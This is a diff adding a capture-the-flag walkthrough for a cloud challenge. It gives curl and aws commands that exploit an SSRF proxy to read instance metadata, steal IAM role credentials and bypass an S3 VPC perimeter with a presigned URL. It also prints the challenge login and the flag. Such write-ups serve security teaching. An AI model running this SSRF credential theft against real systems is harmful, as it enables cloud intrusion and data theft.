@@ -1,0 +1,72 @@
+Perimeter Leak Challenge Walkthrough
+This document details the exploitation chain for the Perimeter Leak challenge. The objective is to bypass an AWS Data Perimeter—specifically an S3 Bucket Policy restricting access to a specific VPC—by leveraging a Server-Side Request Forgery (SSRF) vulnerability and S3 Presigned URLs.
+
+Challenge Overview
+Target: A Spring Boot application on an EC2 instance.
+
+Security Barrier: An AWS Data Perimeter (S3 Bucket Policy) that denies access to the flag bucket unless the request originates from a trusted VPC Endpoint.
+
+Vulnerability: SSRF via a /proxy endpoint.
+
+Step 1: Information Gathering & SSRF Discovery
+We first identify the target storage and the entry point for internal communication.
+
+Enumerate Actuator Endpoints:
+Scan the /actuator path for environment leaks.
+
+Bash
+curl -s -u ctf:88sPVWyC2P3p https://challenge01.cloud-champions.com/actuator/env | grep -i "bucket"
+Result: Target Bucket Name: challenge01-470f711.
+
+Confirm SSRF:
+Test the /proxy endpoint by reaching the internal AWS Instance Metadata Service (IMDS).
+
+Bash
+curl -u ctf:88sPVWyC2P3p "https://challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/"
+Result: The server returns metadata categories, confirming SSRF.
+
+Step 2: Credential Theft via IMDS
+We need the instance's IAM role credentials to sign our own S3 requests.
+
+Get IMDSv2 Token:
+
+Bash
+TOKEN=$(curl -X PUT "https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+Identify IAM Role:
+
+Bash
+curl -H "X-aws-ec2-metadata-token: $TOKEN" "https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+Result: Role Name: challenge01-5592368.
+
+Extract Temporary Credentials:
+
+Bash
+curl -H "X-aws-ec2-metadata-token: $TOKEN" "https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/challenge01-5592368"
+Action: Save the AccessKeyId, SecretAccessKey, and SessionToken.
+
+Step 3: Bypassing the Data Perimeter
+Direct access to the bucket is blocked by the Data Perimeter. We must bundle our Identity (stolen keys) with the server's Network (the proxy).
+
+Configure Local Environment:
+
+Bash
+export AWS_ACCESS_KEY_ID=ASIA...
+export AWS_SECRET_ACCESS_KEY=...
+export AWS_SESSION_TOKEN=...
+Generate a Presigned URL:
+Create a signed link for the flag location (usually private/flag.txt).
+
+Bash
+aws s3 presign s3://challenge01-470f711/private/flag.txt --region us-east-1
+Step 4: Final Execution
+The proxy requires proper encoding to handle the special characters (&, ?, =) in the long S3 signature string.
+
+Final Exploit Command:
+
+Bash
+curl -G "https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy" \
+--data-urlencode "url=<OUTPUT_FROM_PRESIGN_COMMAND>"
+Conclusion
+Flag: WIZ_CTF_Presigned_Urls_Are_Everywhere
+
+Summary: This challenge highlights that network-based perimeters (VPC restrictions) can be circumvented if an application allows an attacker to "proxy" requests from within that network using valid, stolen credentials.
